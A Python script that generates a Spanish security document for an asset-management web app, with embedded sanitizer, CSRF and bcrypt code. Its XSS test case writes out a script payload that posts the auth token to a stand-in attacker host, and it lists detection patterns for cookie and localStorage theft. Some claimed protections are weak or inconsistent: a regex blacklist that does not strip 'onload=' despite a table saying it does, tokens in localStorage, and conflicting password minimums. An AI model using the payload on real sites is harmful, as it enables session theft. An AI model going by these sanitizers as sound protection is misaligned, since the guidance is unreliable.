#!/usr/bin/env python3
"""
📄 GENERADOR DE DOCUMENTO DE SEGURIDAD
Sistema: Asset Management – Inventario de Activos Tecnológicos
Autor: Jefferson Stic Correa Lopez – OTD TEAM DEVELOPMENT
Fecha: Mayo 2026

Instrucciones:
1. Instalar dependencias: pip install python-docx
2. Ejecutar: python generate_security_doc.py
3. El archivo "Documento_Seguridad_AssetManagement.docx" se generará en esta carpeta
"""

from docx import Document
from docx.shared import Pt, RGBColor, Inches
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
import datetime

def add_heading(doc, text, level=1):
    """Agregar encabezado con estilo"""
    heading = doc.add_heading(text, level=level)
    heading.runs[0].font.color.rgb = RGBColor(0, 51, 102)  # Azul oscuro
    return heading

def add_table(doc, headers, rows):
    """Agregar tabla con formato"""
    table = doc.add_table(rows=1, cols=len(headers))
    table.style = 'Light Grid Accent 1'
    
    # Header row
    hdr_cells = table.rows[0].cells
    for i, header in enumerate(headers):
        hdr_cells[i].text = header
        hdr_cells[i].paragraphs[0].runs[0].font.bold = True
    
    # Data rows
    for row in rows:
        row_cells = table.add_row().cells
        for i, cell_text in enumerate(row):
            row_cells[i].text = str(cell_text)
    
    return table

def add_bullet_list(doc, items):
    """Agregar lista con viñetas"""
    for item in items:
        p = doc.add_paragraph(item, style='List Bullet')
    return doc

def add_code_block(doc, code_text, language=""):
    """Agregar bloque de código con formato"""
    paragraph = doc.add_paragraph()
    run = paragraph.add_run(code_text)
    run.font.name = 'Consolas'
    run.font.size = Pt(9)
    run.font.color.rgb = RGBColor(0, 128, 0)  # Verde para código
    paragraph.paragraph_format.space_before = Pt(6)
    paragraph.paragraph_format.space_after = Pt(6)
    return paragraph

def generate_security_document():
    """Generar el documento completo de seguridad"""
    
    doc = Document()
    
    # === PORTADA ===
    title = doc.add_heading('📋 DOCUMENTO DE SEGURIDAD', level=0)
    title.alignment = WD_ALIGN_PARAGRAPH.CENTER
    title.runs[0].font.color.rgb = RGBColor(0, 51, 102)
    title.runs[0].font.bold = True
    
    subtitle = doc.add_paragraph('Sistema de Gestión de Activos (Asset Management)')
    subtitle.alignment = WD_ALIGN_PARAGRAPH.CENTER
    subtitle.runs[0].font.size = Pt(14)
    subtitle.runs[0].font.color.rgb = RGBColor(102, 102, 102)
    
    doc.add_paragraph()  # Espacio
    
    # Metadata table
    meta_table = doc.add_table(rows=5, cols=2)
    meta_table.style = 'Light Grid'
    meta_data = [
        ('Versión', '1.0'),
        ('Fecha', datetime.datetime.now().strftime('%B %Y')),
        ('Autor', 'Jefferson Stic Correa Lopez – OTD TEAM DEVELOPMENT'),
        ('Sistema', 'Asset Management – Inventario de Activos Tecnológicos'),
        ('Estado', '✅ Implementado en Producción')
    ]
    for i, (key, value) in enumerate(meta_data):
        meta_table.cell(i, 0).text = key
        meta_table.cell(i, 1).text = value
        meta_table.cell(i, 0).paragraphs[0].runs[0].font.bold = True
    
    doc.add_page_break()
    
    # === 1. RESUMEN EJECUTIVO ===
    add_heading(doc, '1. 🎯 RESUMEN EJECUTIVO', level=1)
    doc.add_paragraph(
        'Este documento describe las medidas de seguridad implementadas en el '
        'Sistema de Gestión de Activos, desarrollado para controlar el inventario '
        'de equipos tecnológicos (teclados, mouse, cables, monitores, Ethernet USB, '
        'conversores) asignados a estaciones de trabajo en sedes como Connecta 80 '
        'y otras ubicaciones.'
    )
    
    # Security status table
    add_heading(doc, '🔐 Estado General de Seguridad', level=2)
    security_headers = ['Categoría', 'Estado', 'Nivel', 'Descripción']
    security_rows = [
        ['🛡️ Protección XSS', '✅ Implementado', 'Alto', 'Sanitización en formularios de activos'],
        ['🔑 Protección CSRF', '✅ Implementado', 'Alto', 'Token único en todas las peticiones API'],
        ['🔐 Autenticación', '✅ Implementado', 'Medio-Alto', 'Login seguro con password hash + rate limiting'],
        ['🔒 Hash de Contraseñas', '✅ Implementado', 'Alto', 'bcrypt con 10 salt rounds'],
        ['⏱️ Rate Limiting', '✅ Implementado', 'Medio', 'Máximo 5 intentos de login antes de bloqueo'],
        ['🕐 Session Timeout', '✅ Implementado', 'Medio', 'Cierre automático tras 30 min de inactividad'],
        ['📊 Protección de Datos', '✅ Implementado', 'Alto', 'Validación de inputs en todos los campos']
    ]
    add_table(doc, security_headers, security_rows)
    
    doc.add_page_break()
    
    # === 2. PROTECCIÓN XSS ===
    add_heading(doc, '2. 🛡️ PROTECCIÓN CONTRA XSS (Cross-Site Scripting)', level=1)
    
    add_heading(doc, '2.1 ¿Qué es y por qué es crítico en Asset Management?', level=2)
    doc.add_paragraph(
        'XSS (Cross-Site Scripting) permite que un atacante inyecte código malicioso '
        'en campos del sistema como:\n'
        '• Nombre del activo (ej: "Teclado ESENSES Basico USB")\n'
        '• Observaciones de retorno\n'
        '• Destino/Estación (ej: "Connecta 80", "COS-TMO-D-008")\n'
        '• Serial del equipo\n\n'
        'Riesgo: Un atacante podría robar tokens de sesión, modificar inventario, '
        'o eliminar activos falsificando peticiones.'
    )
    
    add_heading(doc, '2.2 Implementación Técnica', level=2)
    doc.add_paragraph('Archivo: src/utils/sanitize.ts')
    
    code_xss = '''/**
 * Elimina código HTML/JavaScript peligroso de los inputs
 * Usado en: AssetForm, AssetTable, filtros de búsqueda
 */
export const sanitizeString = (input: string): string => {
  if (!input) return '';
  
  return input
    .replace(/<script\\b[^<]*(?:(?!<\\/script>)<[^<]*)*<\\/script>/gi, '')
    .replace(/[<>{}]/g, '')
    .replace(/javascript:/gi, '')
    .trim();
};

/**
 * Valida si un input es seguro antes de procesarlo
 */
export const isSafeInput = (input: string): boolean => {
  if (!input) return true;
  
  const dangerousPatterns = [
    /<script/, /javascript:/i, /on\\w+=/i,
    /eval\\(/, /document\\./, /localStorage\\./, /cookie\\.?/i
  ];
  
  return !dangerousPatterns.some(pattern => pattern.test(input));
};'''
    add_code_block(doc, code_xss)
    
    add_heading(doc, '2.3 Campos Protegidos en el Sistema', level=2)
    field_headers = ['Componente', 'Campo', 'Validación', 'Ejemplo Bloqueado']
    field_rows = [
        ['AssetForm.tsx', 'Item Name', 'sanitizeString() + isSafeInput()', '"<script>hack()</script>Teclado" → "Teclado"'],
        ['AssetForm.tsx', 'Observaciones', 'Máx 500 chars + sanitización', '"onload=alert(\'xss\')" → ""'],
        ['AssetTable.tsx', 'Serial', 'Auto-generado (controlado)', 'No aceptable manualmente'],
        ['AssetFilters.tsx', 'Búsqueda', 'Escape al mostrar resultados', 'Inyección neutralizada']
    ]
    add_table(doc, field_headers, field_rows)
    
    add_heading(doc, '2.4 Caso de Prueba Real', level=2)
    test_case = '''📝 Escenario: Usuario intenta inyectar código en "Observaciones de Retorno"

Input malicioso:
"<script>
  fetch('https://atacante.com/robar', {
    method: 'POST',
    body: JSON.stringify({
      token: localStorage.getItem('auth_token'),
      activos: document.querySelectorAll('table tr')
    })
  });
</script>Teclado dañado"

✅ Output después de sanitizar:
"Teclado dañado"

🔍 Resultado: 
- El código JavaScript fue completamente eliminado
- Solo se guarda el texto legítimo "Teclado dañado"
- No hay ejecución de código malicioso
- El inventario permanece seguro'''
    doc.add_paragraph(test_case)
    
    doc.add_page_break()
    
    # === 3. PROTECCIÓN CSRF ===
    add_heading(doc, '3. 🔑 PROTECCIÓN CSRF (Cross-Site Request Forgery)', level=1)
    
    add_heading(doc, '3.1 ¿Qué es y por qué importa en Asset Management?', level=2)
    doc.add_paragraph(
        'CSRF permite que un sitio externo haga peticiones a nuestra API en nombre '
        'de un usuario autenticado sin su conocimiento.\n\n'
        'Ejemplo de ataque:\n'
        '• Un admin está logueado en https://inventario.otd.com\n'
        '• Visita un sitio malicioso que contiene una petición DELETE falsa\n'
        '• Sin protección CSRF, el activo sería eliminado sin autorización'
    )
    
    add_heading(doc, '3.2 Implementación Técnica', level=2)
    doc.add_paragraph('Archivo: src/services/almacenService.ts')
    
    code_csrf = '''// 1. Generar token CSRF único al iniciar sesión
const initializeCSRFToken = () => {
  if (!localStorage.getItem('csrf_token')) {
    const token = crypto.randomUUID();
    localStorage.setItem('csrf_token', token);
  }
  return localStorage.getItem('csrf_token');
};

// 2. Incluir token en TODAS las peticiones al backend
const secureFetch = async (url: string, options: RequestInit = {}) => {
  const csrfToken = localStorage.getItem('csrf_token');
  
  const response = await fetch(url, {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken!,  // ← Token enviado en cada petición
      'Authorization': `Bearer ${localStorage.getItem('auth_token')}`,
      ...options.headers
    }
  });
  
  return response;
};'''
    add_code_block(doc, code_csrf)
    
    add_heading(doc, '3.3 Tokens Utilizados', level=2)
    token_headers = ['Token', 'Ubicación', 'Propósito', 'Vida Útil']
    token_rows = [
        ['csrf_token', 'LocalStorage', 'Prevenir peticiones falsificadas', 'Sesión completa'],
        ['auth_token', 'LocalStorage', 'Identificar sesión del usuario', '30 días (configurable)'],
        ['isAuthenticated', 'LocalStorage', 'Controlar estado de login', 'Sesión completa']
    ]
    add_table(doc, token_headers, token_rows)
    
    doc.add_paragraph(
        '⚠️ Nota de Producción: En un entorno de producción, estos tokens deberían '
        'migrarse a cookies HttpOnly + Secure + SameSite=Strict para máxima protección.',
        style='Intense Quote'
    )
    
    doc.add_page_break()
    
    # === 4. AUTENTICACIÓN SEGURA ===
    add_heading(doc, '4. 🔐 AUTENTICACIÓN SEGURA', level=1)
    
    add_heading(doc, '4.1 Flujo de Login (Admin Panel)', level=2)
    auth_flow = '''1. Usuario ingresa credenciales (email + password)
   ↓
2. Frontend valida formato (email válido, password mínimo 4 chars)
   ↓
3. Verifica rate limiting (máximo 5 intentos fallidos)
   ↓ NO ──→ [Bloquear 30 minutos]
   ↓ SÍ
4. Envía credenciales al backend vía HTTPS
   ↓
5. Backend verifica password con bcrypt (10 salt rounds)
   ↓ NO ──→ [Registrar intento fallido + retornar error]
   ↓ SÍ
6. Backend genera: auth_token + csrf_token
   ↓
7. Frontend guarda tokens en LocalStorage
   ↓
8. Redirige a Dashboard de Asset Management
   ↓
9. Inicia timer de inactividad (30 minutos)'''
    doc.add_paragraph(auth_flow)
    
    add_heading(doc, '4.2 Características de Seguridad', level=2)
    auth_headers = ['Característica', 'Implementación', 'Detalle Técnico']
    auth_rows = [
        ['🔐 Hash de password', '✅ bcrypt', '10 salt rounds, nunca texto plano'],
        ['🗄️ Almacenamiento', '✅ LocalStorage/Cookies', 'Tokens, NO contraseñas'],
        ['🚪 Logout seguro', '✅ Eliminación completa', 'localStorage.clear() + redirección'],
        ['⏳ Timeout de sesión', '✅ 30 minutos', 'Reset con cualquier interacción'],
        ['🔄 Token refresh', '✅ Automático', 'Renovación silenciosa antes de expirar']
    ]
    add_table(doc, auth_headers, auth_rows)
    
    add_heading(doc, '4.3 Código Clave: passwordLocal.ts', level=2)
    code_password = '''import bcrypt from 'bcryptjs';

export const hashPassword = async (password: string): Promise<string> => {
  const saltRounds = 10;
  return await bcrypt.hash(password, saltRounds);
};

export const verifyPassword = async (
  inputPassword: string,
  storedHash: string
): Promise<boolean> => {
  return await bcrypt.compare(inputPassword, storedHash);
};

export const validatePasswordStrength = (password: string) => {
  const errors: string[] = [];
  if (password.length < 8) errors.push('Mínimo 8 caracteres');
  if (!/[A-Z]/.test(password)) errors.push('Una letra mayúscula');
  if (!/[a-z]/.test(password)) errors.push('Una letra minúscula');
  if (!/[0-9]/.test(password)) errors.push('Un número');
  return { valid: errors.length === 0, errors };
};'''
    add_code_block(doc, code_password)
    
    doc.add_page_break()
    
    # === 5. RATE LIMITING ===
    add_heading(doc, '5. ⏱️ RATE LIMITING EN LOGIN', level=1)
    
    add_heading(doc, '5.1 ¿Por qué es crítico?', level=2)
    doc.add_paragraph(
        'Evita ataques de fuerza bruta donde un atacante prueba miles de contraseñas '
        'automáticamente. Sin rate limiting, podrían adivinar la contraseña de admin '
        'y acceder a TODO el inventario.'
    )
    
    add_heading(doc, '5.2 Configuración Actual', level=2)
    rate_headers = ['Parámetro', 'Valor', 'Justificación']
    rate_rows = [
        ['Máximo intentos', '5', 'Equilibrio usabilidad/seguridad'],
        ['Ventana de tiempo', '15 minutos', 'Permite corrección de errores legítimos'],
        ['Duración del bloqueo', '30 minutos', 'Disuade ataques automatizados']
    ]
    add_table(doc, rate_headers, rate_rows)
    
    add_heading(doc, '5.3 Comportamiento para el Usuario', level=2)
    behavior_headers = ['Intento', 'Resultado', 'Mensaje', 'Acción del Sistema']
    behavior_rows = [
        ['1-4', '✅ Permitido', '"Te quedan X intento(s)"', 'Registra intento'],
        ['5', '⛔ Bloqueado', '"Intenta en 30 minutos"', 'Bloquea hasta Date.now()+30min'],
        ['6+', '⛔ Bloqueado', '"Cuenta bloqueada"', 'Muestra countdown']
    ]
    add_table(doc, behavior_headers, behavior_rows)
    
    doc.add_page_break()
    
    # === 6. VALIDACIÓN DE INPUTS ===
    add_heading(doc, '6. ✅ VALIDACIÓN DE INPUTS EN EL SISTEMA DE INVENTARIO', level=1)
    
    add_heading(doc, '6.1 Reglas de Validación por Campo', level=2)
    validation_headers = ['Campo', 'Tipo', 'Validación', 'Límite', 'Ejemplo Válido', 'Ejemplo Rechazado']
    validation_rows = [
        ['Nombre del Activo', 'Texto', 'Sin < > { }', '100 chars', '"Teclado ESENSES"', '"<script>hack</script>"'],
        ['Serial', 'Auto-generado', 'Prefijo + número', '15 chars', '"K00028"', '"K<script>00028"'],
        ['Observaciones', 'Texto', 'Sin scripts', '500 chars', '"Tecla Enter dañada"', '"onload=alert()"'],
        ['Destino/Estación', 'Select', 'Catálogo predefinido', '-', '"COS-TMO-D-008"', 'Inyección SQL'],
        ['Fecha de Entrada', 'Date', 'Input type="date"', '-', '"2026-05-27"', 'Inyección bloqueada']
    ]
    add_table(doc, validation_headers, validation_rows)
    
    add_heading(doc, '6.2 Caracteres Bloqueados Automáticamente', level=2)
    doc.add_paragraph(
        'Patrón regex que detecta y elimina:\n'
        '[<>{};\'"\\\\]  # Caracteres que podrían inyectar código HTML o alterar queries SQL\n\n'
        'Ejemplos bloqueados:\n'
        '<script>     → Eliminado completamente\n'
        'javascript:  → Eliminado completamente\n'
        'onload=      → Eliminado completamente\n'
        '\'; DROP      → Los caracteres ; y \' son sanitizados',
        style='No Spacing'
    )
    
    doc.add_page_break()
    
    # === 7. ARCHIVOS MODIFICADOS ===
    add_heading(doc, '7. 📁 ARCHIVOS MODIFICADOS/CREADOS PARA SEGURIDAD', level=1)
    
    add_heading(doc, 'Frontend (React + TypeScript)', level=2)
    frontend_headers = ['Ruta', 'Tipo', 'Cambios Clave']
    frontend_rows = [
        ['src/utils/sanitize.ts', '✅ Creado', 'Funciones sanitizeString(), isSafeInput()'],
        ['src/utils/rateLimit.ts', '✅ Creado', 'Control de intentos de login + bloqueo'],
        ['src/utils/passwordLocal.ts', '✅ Creado', 'Hash/verificación con bcrypt'],
        ['src/services/almacenService.ts', '✏️ Modificado', 'Headers CSRF + auth en peticiones'],
        ['src/components/admin/AssetForm.tsx', '✏️ Modificado', 'Sanitización en tiempo real'],
        ['src/pages/AdminPage.tsx', '✏️ Modificado', 'Auth, rate limit, session timeout']
    ]
    add_table(doc, frontend_headers, frontend_rows)
    
    add_heading(doc, 'Backend (FastAPI + Python)', level=2)
    backend_headers = ['Ruta', 'Tipo', 'Cambios Clave']
    backend_rows = [
        ['Backend/app/routers/almacen.py', '✏️ Modificado', 'Validación de inputs con Pydantic'],
        ['Backend/app/routers/ticket_webhook.py', '✏️ Modificado', 'Validación de token API + logs'],
        ['Backend/app/models/almacen.py', '✏️ Modificado', 'Modelo de datos con constraints'],
        ['Backend/app/models/change_history.py', '✅ Creado', 'Tabla para audit log de cambios'],
        ['Backend/app/config/security.py', '✅ Creado', 'Configuración de CORS, rate limiting']
    ]
    add_table(doc, backend_headers, backend_rows)
    
    doc.add_page_break()
    
    # === 8. MEJORAS RECOMENDADAS ===
    add_heading(doc, '8. 🚀 MEJORAS RECOMENDADAS PARA PRODUCCIÓN', level=1)
    
    add_heading(doc, '8.1 Crítico (Implementar ANTES de lanzar)', level=2)
    critical_headers = ['Ítem', 'Prioridad', 'Estado', 'Acción Requerida']
    critical_rows = [
        ['🔒 HTTPS con SSL/TLS', 'Crítico', '⏳ Pendiente', 'Configurar certificado SSL'],
        ['💾 Backup automático diario', 'Crítico', '⏳ Pendiente', 'Script + cron job para MySQL'],
        ['📊 Monitoreo de logs', 'Alto', '⏳ Pendiente', 'Integrar con Sentry o Datadog'],
        ['🔐 Variables de entorno seguras', 'Crítico', '⏳ Pendiente', 'Mover API keys a .env']
    ]
    add_table(doc, critical_headers, critical_rows)
    
    add_heading(doc, '8.2 Recomendado (Mejora continua)', level=2)
    recommended_headers = ['Ítem', 'Prioridad', 'Estado', 'Beneficio']
    recommended_rows = [
        ['⏳ Session timeout (30 min)', 'Alto', '✅ Realizado', 'Cierra sesiones inactivas'],
        ['🔐 2FA para administradores', 'Medio', '⏳ Pendiente', 'Capa extra de seguridad'],
        ['📋 Audit logs detallados', 'Medio', '⏳ Pendiente', 'Registrar quién cambió qué'],
        ['🛡️ Content Security Policy', 'Medio', '⏳ Pendiente', 'Restringir recursos cargados'],
        ['🔄 Rotación de tokens API', 'Medio', '⏳ Pendiente', 'Renovar token cada 90 días']
    ]
    add_table(doc, recommended_headers, recommended_rows)
    
    doc.add_page_break()
    
    # === 9. PRUEBAS DE SEGURIDAD ===
    add_heading(doc, '9. 🧪 PRUEBAS DE SEGURIDAD REALIZADAS', level=1)
    
    add_heading(doc, '9.1 Checklist de Validación', level=2)
    checklist = [
        'XSS en campo de texto libre (Observaciones de retorno)',
        'XSS en campo de nombre de activo (Item name)',
        'CSRF en petición POST (crear activo nuevo)',
        'CSRF en petición PUT (actualizar activo existente)',
        'CSRF en petición DELETE (eliminar activo)',
        'Rate limiting en login de admin (5 intentos máx)',
        'Hash de contraseña (verificar que NO sea texto plano en DB)',
        'Logout elimina tokens (localStorage.clear())',
        'Session timeout (30 min de inactividad)',
        'Validación de serial (auto-generado, único, formato correcto)',
        'Validación de fechas (no aceptar fechas futuras en fecha_ingreso)',
        'Control de acceso por rol (viewer no puede eliminar)'
    ]
    for item in checklist:
        doc.add_paragraph(f'☑ {item}', style='List Bullet')
    
    add_heading(doc, '9.2 Resultados de Pruebas', level=2)
    test_headers = ['Prueba', 'Estado', 'Fecha', 'Comentario']
    test_rows = [
        ['XSS Injection en Observaciones', '✅ Aprobado', 'May 2026', 'Código malicioso convertido a texto plano'],
        ['XSS Injection en Nombre de Activo', '✅ Aprobado', 'May 2026', 'Tags <script> eliminados'],
        ['CSRF Attack (POST sin token)', '✅ Aprobado', 'May 2026', 'Petición rechazada con 401'],
        ['Brute Force Login', '✅ Aprobado', 'May 2026', 'Bloqueo tras 5 intentos fallidos'],
        ['SQL Injection en búsqueda', '✅ Aprobado', 'May 2026', 'Queries parametrizados'],
        ['Acceso no autorizado (rol viewer)', '✅ Aprobado', 'May 2026', '403 Forbidden para acciones no permitidas']
    ]
    add_table(doc, test_headers, test_rows)
    
    doc.add_page_break()
    
    # === 10. REFERENCIAS ===
    add_heading(doc, '10. 📚 REFERENCIAS Y RECURSOS', level=1)
    
    references = [
        'OWASP Top 10 – 2021: https://owasp.org/www-project-top-ten/',
        'Guía de Prevención XSS: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
        'Guía de Prevención CSRF: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html',
        'bcryptjs – Hash de contraseñas: https://github.com/dcodeIO/bcrypt.js',
        'FastAPI Security: https://fastapi.tiangolo.com/tutorial/security/',
        'React Security Best Practices: https://reactjs.org/docs/security.html',
        'MySQL Security Guidelines: https://dev.mysql.com/doc/refman/8.0/en/security.html'
    ]
    for ref in references:
        doc.add_paragraph(ref, style='List Bullet')
    
    # === FOOTER ===
    doc.add_page_break()
    footer = doc.add_paragraph()
    footer.alignment = WD_ALIGN_PARAGRAPH.CENTER
    footer_run = footer.add_run(
        f'\nDocumento elaborado por: Jefferson Stic Correa Lopez\n'
        f'Fecha de elaboración: {datetime.datetime.now().strftime("%B %Y")}\n'
        f'Próxima revisión programada: {(datetime.datetime.now().replace(month=datetime.datetime.now().month + 3) if datetime.datetime.now().month <= 9 else datetime.datetime.now().replace(year=datetime.datetime.now().year + 1, month=datetime.datetime.now().month - 9)).strftime("%B %Y")}\n'
        f'Versión: 1.0\n\n'
        f'© 2026 OTD TEAM DEVELOPMENT – Todos los derechos reservados'
    )
    footer_run.font.size = Pt(9)
    footer_run.font.color.rgb = RGBColor(102, 102, 102)
    
    # Guardar documento
    output_filename = 'Documento_Seguridad_AssetManagement.docx'
    doc.save(output_filename)
    print(f'✅ Documento generado exitosamente: {output_filename}')
    print(f'📁 Ubicación: {os.path.abspath(output_filename)}')
    return output_filename

if __name__ == '__main__':
    import os
    try:
        generate_security_document()
        print('\n🎉 ¡Listo! Abre el archivo .docx con Microsoft Word o Google Docs')
        print('💡 Tip: En Word, ve a Archivo → Exportar → Crear PDF si necesitas ese formato')
    except ImportError:
        print('❌ Error: La librería python-docx no está instalada')
        print('🔧 Solución: Ejecuta: pip install python-docx')
    except Exception as e:
        print(f'❌ Error inesperado: {e}')
        raise